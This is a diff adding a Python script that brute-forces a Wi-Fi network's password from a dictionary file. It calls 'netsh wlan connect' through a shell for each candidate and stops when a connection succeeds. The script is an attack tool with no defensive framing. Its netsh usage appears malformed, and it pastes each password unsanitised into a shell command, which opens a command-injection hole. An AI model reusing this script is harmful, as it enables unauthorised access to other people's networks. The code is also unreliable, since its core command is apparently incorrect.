@@ -1,0 +1,21 @@
+import itertools
+import time
+import subprocess
+
+# Define the dictionary file to use
+dictionary_file = 'C:\Programs\Python\Python311\password.txt'
+
+# Loop through each password in the dictionary file and try to connect to the network
+with open(dictionary_file, 'r') as f:
+    for password in f:
+        password_str = password.strip()
+        print(f'Trying password: {password_str}')
+        try:
+            # Use subprocess to call the operating system's command line to attempt to connect to the network with the current password
+            subprocess.check_output(f'netsh wlan connect name="teste" ssid="teste" keyMaterial="{password_str}"', shell=True)
+            print(f'Successful connection with password: {password_str}')
+            break
+        except subprocess.CalledProcessError as e:
+            # Print the exception message and wait for a few seconds before trying the next password
+            print(f'Failed with error: {e}')
+            time.sleep(1)
